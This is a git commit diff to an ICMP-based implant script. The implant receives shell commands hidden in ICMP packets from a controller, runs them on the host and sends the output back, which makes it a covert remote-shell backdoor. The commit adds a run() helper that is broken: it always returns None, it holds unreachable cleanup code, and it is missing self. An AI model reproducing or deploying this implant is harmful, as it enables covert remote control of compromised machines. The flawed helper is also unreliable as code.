2e0aab24e2e16644741d8e1c249d0b66179e5835
Vaughn Woerpel <vaughnwoerpel@gmail.com>
2023-10-14 23:24:49 -0400

    update

--- implant.py
+++ implant.py
@@ -2,7 +2,9 @@
 
 from scapy.all import sr,IP,ICMP,Raw,sniff
 import base64
+import shlex
 from shellylib import Host
+from threading import Timer
 from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen
 
 ICMP_ID = int(12800)
@@ -17,14 +19,25 @@ class Implant(Host):
     def join(self, shellpack):
         self.send(shellpack['ip'], "join")
 
+    def run(cmd, timeout_sec):
+        proc = Popen(shlex.split(cmd), stdout=PIPE, stderr=PIPE)
+        timer = Timer(timeout_sec, proc.kill)
+        try:
+            timer.start()
+            stdout, _ = proc.communicate()
+            return stdout
+        finally:
+            return None
+            timer.cancel()
+
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
             # cmds = cmd.split("|")
             #cmd = cmd.split(" ")
-            ps = check_output(cmd,shell=True,stdout=PIPE,stderr=STDOUT,timeout=3)
-            output = ps.communicate()[0]
-            
+            output = self.run(cmd, 3)
+            if output is None:
+                raise TimeoutExpired
             self.send(self.controller_ip, "instruction", output)
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
